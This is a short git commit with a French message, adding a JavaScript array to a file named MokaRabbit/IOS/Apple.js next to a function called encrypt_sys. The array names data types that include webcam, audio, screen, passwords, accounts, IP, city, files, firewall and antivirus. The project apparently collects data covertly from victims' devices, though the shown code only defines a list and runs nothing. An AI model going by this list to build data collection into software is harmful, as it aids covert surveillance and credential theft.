8f4bf55f0429083648afe4c3de5c52fbcabd8064
G0LD R4BB1T <goldrabbit907@gmail.com>
2024-08-31 23:23:52 +0200

    ajout d'un tableau pour iphone mac et bsd

--- MokaRabbit/IOS/Apple.js
+++ MokaRabbit/IOS/Apple.js
@@ -14,3 +14,24 @@ function encrypt_sys() {
 
 }
 
+let Data = [
+    "stream",
+    "webcam",
+    "audio",
+    "screen",
+    "system",
+    "process",
+    "passwords",
+    "accounts",
+    "user",
+    "ip",
+    "addresses", 
+    "flags",
+    "city",
+    "files",
+    "devices",
+    "firewall",  
+    "antivirus", 
+
+]
+Data.push("usernames used");
